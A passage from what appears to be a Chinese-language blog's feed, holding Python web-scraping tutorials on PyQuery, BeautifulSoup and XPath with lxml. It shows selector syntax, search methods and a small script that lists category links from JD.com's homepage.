python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#div.content 下面第二个（含）之后的li标签</span></span><br><span class="line">lis = doc(<span class="string">'div.content li:gt(1)'</span>).items()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    print(i.text(),i(<span class="string">'a'</span>).attr(<span class="string">'href'</span>))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># gt就是greater than,大于的意思，lt (less than)是小于</span></span><br></pre></td></tr></table></figure><p>筛选文本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lis = doc(<span class="string">'div.content ul'</span>).items()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="comment">#文本包含问号的li标签</span></span><br><span class="line">    print(i(<span class="string">"li:contains('？')"</span>).text())</span><br></pre></td></tr></table></figure><p>2.修改标签属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用remove把特定标签移除，然后再进行遍历</span></span><br><span class="line">lis = doc(<span class="string">'div.content ul'</span>).remove(<span class="string">'.content-article'</span>).items()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    print(i.text())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 还有如修改属性，增加css之类的一些使用率较低的，用到的时候去官方文档查</span></span><br></pre></td></tr></table></figure><p>###### </p><h6 id="直接在Chrome里调试"><a href="#直接在Chrome里调试" class="headerlink" title="直接在Chrome里调试"></a>直接在Chrome里调试</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Chrome浏览器自带css的查询方法，按f12或者右键检查，打开Elements面板，按ctrl+f，</span><br><span class="line"></span><br><span class="line">这里支持xpath，css语法，以及普通的字符查找</span><br><span class="line"></span><br><span class="line">要注意的是右边的数字，显示的是满足条件的标签数量，可以按向下的箭头过一遍，看看是不是自己想要的信息。</span><br></pre></td></tr></table></figure><p>京东的商品栏目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://www.jd.com/'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line">doc = pq(r.text)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="comment"># for i in doc("li.cate_menu_item:nth-child(3) a").items():</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> doc(<span class="string">"li.cate_menu_item:gt(1) a"</span>).items():</span><br><span class="line">    <span class="comment"># print(i.text())</span></span><br><span class="line">    print(i.attr(<span class="string">'href'</span>))</span><br><span class="line">    print(i.text())</span><br><span class="line">    flag = flag + <span class="number">1</span></span><br><span class="line">    print(<span class="string">"------------"</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>参考文章：<a href="https://www.jianshu.com/p/7eb136bbe317" target="_blank" rel="noopener">https://www.jianshu.com/p/7eb136bbe317</a></p></blockquote><blockquote><p>更多用法：<a href="https://pythonhosted.org/pyquery/" target="_blank" rel="noopener">https://pythonhosted.org/pyquery/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Python爬虫解析库，主流的有&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PyQuery&lt;/li&gt;
&lt;li&gt;Beautifulsoup&lt;/li&gt;
&lt;li&gt;Scrapy Selectors&lt;/li&gt;
&lt;li&gt;正则表达式。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;PyQ
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="PyQuery" scheme="http://www.xpshuai.cn/tags/PyQuery/"/>
    
  </entry>
  
  <entry>
    <title>python-Beautifulsoup</title>
    <link href="http://www.xpshuai.cn/python-Beautifulsoup/"/>
    <id>http://www.xpshuai.cn/python-Beautifulsoup/</id>
    <published>2020-02-19T12:01:58.000Z</published>
    <updated>2020-02-20T10:13:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>Beautifulsoup也是用来解析网页数据的</p><h4 id="BeautifulSoup对象四种类型"><a href="#BeautifulSoup对象四种类型" class="headerlink" title="BeautifulSoup对象四种类型:"></a>BeautifulSoup<code>对象四种类型</code>:</h4><ul><li>tag</li><li>NavigableString</li><li>BeautifulSoap</li><li>Comment</li></ul><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install beautifulsoup4</span><br></pre></td></tr></table></figure><h6 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(html_doc, <span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line">print(soup.title)</span><br></pre></td></tr></table></figure><h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><h6 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(open(<span class="string">"index.html"</span>))  <span class="comment">#文件句柄</span></span><br><span class="line">soup = BeautifulSoup(<span class="string">"&lt;html&gt;data&lt;/html&gt;"</span>)  <span class="comment">#字符串</span></span><br></pre></td></tr></table></figure><h6 id="find-和-find-all"><a href="#find-和-find-all" class="headerlink" title="find 和 find_all"></a>find 和 find_all</h6><p>搜索当前 tag 的所有 tag 子节点，并判断是否符合过滤器的条件</p><p><strong>语法：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find(name=<span class="literal">None</span>, attrs=&#123;&#125;, recursive=<span class="literal">True</span>, text=<span class="literal">None</span>, **kwargs) </span><br><span class="line"></span><br><span class="line">find_all(name=<span class="literal">None</span>, attrs=&#123;&#125;, recursive=<span class="literal">True</span>, text=<span class="literal">None</span>, limit=<span class="literal">None</span>, **kwargs)</span><br></pre></td></tr></table></figure><p>通过 attrs 参数传递： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data_soup = BeautifulSoup(<span class="string">'&lt;div data-foo="value"&gt;foo!&lt;/div&gt;'</span>) </span><br><span class="line"></span><br><span class="line">print(data_soup.find_all(attrs=&#123;<span class="string">"data-foo"</span>: <span class="string">"value"</span>&#125;))</span><br></pre></td></tr></table></figure><p>按 class_ 查找:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">css_soup = BeautifulSoup(<span class="string">'&lt;p class="body bold strikeout"&gt;&lt;/p&gt;'</span>) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(css_soup.find_all(<span class="string">"p"</span>, class_=<span class="string">"strikeout"</span>)) </span><br><span class="line"><span class="built_in">print</span>(css_soup.find_all(<span class="string">"p"</span>, class_=<span class="string">"body"</span>))</span><br></pre></td></tr></table></figure><p>其他搜索方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">find_parents()　　　　　 <span class="comment"># 返回所有祖先节点</span></span><br><span class="line"></span><br><span class="line">find_parent()　　　　　　<span class="comment"># 返回直接父节点</span></span><br><span class="line"></span><br><span class="line">find_next_siblings()　　 <span class="comment"># 返回后面所有的兄弟节点</span></span><br><span class="line"></span><br><span class="line">find_next_sibling()　　 <span class="comment"># 返回后面的第一个兄弟节点</span></span><br><span class="line"></span><br><span class="line">find_previous_siblings() <span class="comment"># 返回前面所有的兄弟节点</span></span><br><span class="line"></span><br><span class="line">find_previous_sibling() <span class="comment">#　返回前面第一个兄弟节点</span></span><br><span class="line"></span><br><span class="line">find_all_next()　　　　 <span class="comment"># 返回节点后所有符合条件的节点</span></span><br><span class="line"></span><br><span class="line">find_next()　　　　　　<span class="comment"># 返回节点后第一个符合条件的节点</span></span><br><span class="line"></span><br><span class="line">find_all_previous()　　 <span class="comment"># 返回节点前所有符合条件的节点</span></span><br><span class="line"></span><br><span class="line">find_previous()　　　　 <span class="comment"># 返回节点前所有符合条件的节点</span></span><br></pre></td></tr></table></figure><p>从文档中找到所有a标签的链接:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> soup.find_all(<span class="string">'a'</span>):</span><br><span class="line">    print(link.get(<span class="string">'href'</span>))</span><br></pre></td></tr></table></figure><p>从文档中获取所有文字内容:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.get_text())</span><br></pre></td></tr></table></figure><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><h6 id="Tag"><a href="#Tag" class="headerlink" title="Tag"></a>Tag</h6><p><code>Tag</code>对象与XML或HTML原生文档中的tag相同</p><p>tag中最重要的属性: <code>name</code>和<code>attributes</code></p><ul><li><p>name</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tag.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复赋值</span></span><br><span class="line">tag.name = <span class="string">"xxx"</span></span><br></pre></td></tr></table></figure></li><li><p>attributes</p><p>一个tag可能有很多个属性，一个属性可能有很多个值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取tag的指定属性的属性值</span></span><br><span class="line">tag[<span class="string">'class'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取tag的全部属性及属性值:</span></span><br><span class="line">tag.attrs</span><br><span class="line"></span><br><span class="line"><span class="comment"># tag属性及属性值添加</span></span><br><span class="line">tag[<span class="string">'class'</span>] = <span class="string">'row'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 属性值的删除</span></span><br><span class="line"><span class="keyword">del</span> tag[<span class="string">'class'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看属性值</span></span><br><span class="line">print(tag.get(<span class="string">'class'</span>))</span><br></pre></td></tr></table></figure><p>多值属性tag：   返回类型一般是list,但当某个属性在任何版本的HTML定义中都没有被定义为多值属性时，会将这个属性作为字符串返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">css_soup = BeautifulSoup(<span class="string">'&lt;p class="body row"&gt;&lt;/p&gt;'</span>)</span><br><span class="line">css_soup.p[<span class="string">'class'</span>]</span><br><span class="line"><span class="comment"># ["body", "row"]</span></span><br><span class="line"></span><br><span class="line">css_soup = BeautifulSoup(<span class="string">'&lt;p class="body"&gt;&lt;/p&gt;'</span>)</span><br><span class="line">css_soup.p[<span class="string">'class'</span>]</span><br><span class="line"><span class="comment"># ["body"]</span></span><br><span class="line"></span><br><span class="line">id_soup = BeautifulSoup(<span class="string">'&lt;p id="my id"&gt;&lt;/p&gt;'</span>)</span><br><span class="line">id_soup.p[<span class="string">'id'</span>]</span><br><span class="line"><span class="comment"># 'my id'</span></span><br></pre></td></tr></table></figure><blockquote><p>如果转换的文档是XML格式,那么tag中不包含多值属性</p></blockquote><p>获取tag某个子节点:   <code>soup.tag名</code>， <code>soup.a</code></p><p>获取tag全部子节点:  <code>.contents</code> 和 <code>.children</code></p><p>获取tag全部子节点及子孙节点：<code>.descendants</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> head_tag.descendants:</span><br><span class="line">    print(child)</span><br></pre></td></tr></table></figure><p>节点内的字符串:     </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .string</span></span><br><span class="line">head_tag.string</span><br><span class="line"></span><br><span class="line"><span class="comment"># .strings     如果tag中包含多个字符串`.strings` 来循环获取</span></span><br><span class="line">head_tag.strings</span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> soup.strings:</span><br><span class="line">    print(repr(string))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># .stripped_strings  去除空行空白</span></span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> soup.stripped_strings:</span><br><span class="line">    print(repr(string))</span><br></pre></td></tr></table></figure><p>父亲节点：<code>.parent</code></p><p>所有父辈节点：<code>.parents</code></p><p>兄弟节点: <code>.prettify()</code>, 其中<code>next_sibling</code>和<code>previous_sibling</code>是前后兄弟</p><p><strong>回退和前进：</strong>  通过 <code>.next_elements</code> 和 <code>.previous_elements</code> 的迭代器就可以向前或向后访问文档的解析内容,就好像文档正在被解析一样</p></li></ul><h6 id="find-all"><a href="#find-all" class="headerlink" title="find_all"></a>find_all</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤str</span></span><br><span class="line">soup.find_all(<span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤正则</span></span><br><span class="line"><span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(re.compile(<span class="string">"^b"</span>)):</span><br><span class="line">   print(tag.name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤多个</span></span><br><span class="line">soup.find_all([<span class="string">"a"</span>, <span class="string">"b"</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># True:可以匹配任何值,下面代码查找到所有的`一级`tag</span></span><br><span class="line"><span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(<span class="literal">True</span>):</span><br><span class="line">   print(tag.name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># limit 显示返回数量</span></span><br><span class="line">soup.find_all(<span class="string">"a"</span>, limit=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只搜索tag的直接子节点,</span></span><br><span class="line">soup.html.find_all(<span class="string">"title"</span>, recursive=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(tag)</span>:</span>  <span class="comment">#包含 class 属性却不包含 id 属性</span></span><br><span class="line">   <span class="keyword">return</span> tag.has_attr(<span class="string">'class'</span>) <span class="keyword">and</span> <span class="keyword">not</span> tag.has_attr(<span class="string">'id'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用</span></span><br><span class="line">soup.find_all(test)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下面两行代码是等价的</span></span><br><span class="line">soup.find_all(<span class="string">'div'</span>, limit=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">soup.find(<span class="string">'div'</span>)</span><br></pre></td></tr></table></figure><blockquote><p><strong>区别</strong>:find_all() 方法的返回结果是值包含一个元素的列表,而 find() 方法直接返回结果.find_all() 方法没有找到目标是返回空列表, find() 方法找不到目标时,返回 None</p></blockquote><h6 id="NavigableString"><a href="#NavigableString" class="headerlink" title="NavigableString"></a>NavigableString</h6><p>可遍历字符串</p><p>通过 <code>unicode()</code> 方法可以直接将 <code>NavigableString</code> 对象转换成Unicode字符串:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicode_string = unicode(tag.string)</span><br></pre></td></tr></table></figure><h6 id="BeautifulSoup"><a href="#BeautifulSoup" class="headerlink" title="BeautifulSoup"></a>BeautifulSoup</h6><p>表示的是一个文档的全部内容,可以把它当作 <code>Tag</code> 对象，是一个特殊的 Tag，我们可以分别获取它的类型，名称，以及属性。</p><h6 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">html_doc=<span class="string">'&lt;a href="http://z.com" class="row" id="box"&gt;&lt;!-- hhh --&gt;&lt;/a&gt;'</span></span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(html_doc, <span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line">print(soup.a.string)   <span class="comment"># hhh</span></span><br><span class="line">print(type(soup.a.string))  <span class="comment">#  &lt;class 'bs4.element.Comment'&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">a 标签里的内容实际上是注释，但是如果我们利用 .string 来输出它的内容，我们发现它已经把注释符号去掉了，所以这可能会给我们带来不必要的麻烦。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment"># 在使用前最好做一下判断</span></span><br><span class="line"><span class="keyword">if</span> type(soup.a.string)==bs4.element.Comment:</span><br><span class="line">    <span class="keyword">print</span> soup.a.string</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Beautifulsoup也是用来解析网页数据的&lt;/p&gt;
&lt;h4 id=&quot;BeautifulSoup对象四种类型&quot;&gt;&lt;a href=&quot;#BeautifulSoup对象四种类型&quot; class=&quot;headerlink&quot; title=&quot;BeautifulSoup对象四种类型:&quot;&gt;
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="Beautifulsoup" scheme="http://www.xpshuai.cn/tags/Beautifulsoup/"/>
    
  </entry>
  
  <entry>
    <title>python-XPath</title>
    <link href="http://www.xpshuai.cn/python-XPath/"/>
    <id>http://www.xpshuai.cn/python-XPath/</id>
    <published>2020-02-19T11:58:52.000Z</published>
    <updated>2020-02-23T07:35:22.000Z</updated>
    
    <content type="html"><![CDATA[<h6 id="XPath"><a href="#XPath" class="headerlink" title="XPath"></a>XPath</h6><p>XPath，全称 XML Path Language，即 XML 路径语言，它是一门在 XML 文档中查找信息的语言。最初是用来搜寻 XML 文档的，但同样适用于 HTML 文档的搜索。所以在做爬虫时完全可以使用 XPath 做相应的信息抽取。</p><h3 id="python库lxml的安装"><a href="#python库lxml的安装" class="headerlink" title="python库lxml的安装"></a>python库lxml的安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install lxml</span><br></pre></td></tr></table></figure><h3 id="XPath常用规则"><a href="#XPath常用规则" class="headerlink" title="XPath常用规则"></a>XPath常用规则</h3><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td>nodename</td><td>选取此节点的所有子节点</td></tr><tr><td>/</td><td>从当前节点选取直接子节点</td></tr><tr><td>//</td><td>从当前节点选取子孙节点</td></tr><tr><td>.</td><td>选取当前节点</td></tr><tr><td>..</td><td>选取当前节点的父节点</td></tr><tr><td>@</td><td>选取属性</td></tr><tr><td>*</td><td>通配符，选择所有元素节点与元素名</td></tr><tr><td>@*</td><td>选取所有属性</td></tr><tr><td>[@attrib]</td><td>选取具有给定属性的所有元素</td></tr><tr><td>[@attrib=’value’]</td><td>选取给定属性具有给定值的所有元素</td></tr><tr><td>[tag]</td><td>选取所有具有指定元素的直接子节点</td></tr><tr><td>[tag=’text’]</td><td>选取所有具有指定元素并且文本内容是text节点</td></tr></tbody></table><h3 id="XPath中的运算符"><a href="#XPath中的运算符" class="headerlink" title="XPath中的运算符"></a>XPath中的运算符</h3><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th><th>返回值</th></tr></thead><tbody><tr><td>or</td><td>或</td><td>age=19 or age=20</td><td>如果age等于19或者等于20则返回true反正返回false</td></tr><tr><td>and</td><td>与</td><td>age&gt;19 and age&lt;21</td><td>如果age等于20则返回true，否则返回false</td></tr><tr><td>mod</td><td>取余</td><td>5 mod 2</td><td>1</td></tr><tr><td>\</td><td></td><td>取两个节点的集合</td><td>//book \</td><td>//cd</td><td>返回所有拥有book和cd元素的节点集合</td></tr><tr><td>+</td><td>加</td><td>6+4</td><td>10</td></tr><tr><td>-</td><td>减</td><td>6-4</td><td>2</td></tr><tr><td>*</td><td>乘</td><td>6*4</td><td>24</td></tr><tr><td>div</td><td>除法</td><td>8 div 4</td><td>2</td></tr><tr><td>=</td><td>等于</td><td>age=19</td><td>true</td></tr><tr><td>!=</td><td>不等于</td><td>age!=19</td><td>true</td></tr><tr><td>&lt;</td><td>小于</td><td>age&lt;19</td><td>true</td></tr><tr><td>&lt;=</td><td>小于或等于</td><td>age&lt;=19</td><td>true</td></tr><tr><td>&gt;</td><td>大于</td><td>age&gt;19</td><td>true</td></tr><tr><td>&gt;=</td><td>大于或等于</td><td>age&gt;=19</td><td>true</td></tr></tbody></table><h3 id="解析方式"><a href="#解析方式" class="headerlink" title="解析方式"></a>解析方式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">text=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-0"&gt;&lt;a href="link1.html"&gt;第一个&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class="item-0"&gt;&lt;a href="link5.html"&gt;a属性&lt;/a&gt;</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.读取文本解析节点</span></span><br><span class="line">html=etree.HTML(text) <span class="comment">#初始化生成一个XPath解析对象</span></span><br><span class="line">result=etree.tostring(html,encoding=<span class="string">'utf-8'</span>)   <span class="comment">#解析对象输出代码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.读取HTML文件进行解析</span></span><br><span class="line">html=etree.parse(<span class="string">'test.html'</span>,etree.HTMLParser()) <span class="comment">#指定解析器HTMLParser会根据文件修复HTML文件中缺失的如声明信息</span></span><br><span class="line">result=etree.tostring(html)   <span class="comment">#解析成字节</span></span><br><span class="line"><span class="comment">#result=etree.tostringlist(html) #解析成列表</span></span><br></pre></td></tr></table></figure><h4 id="获取元素节点"><a href="#获取元素节点" class="headerlink" title="获取元素节点"></a>获取元素节点</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td 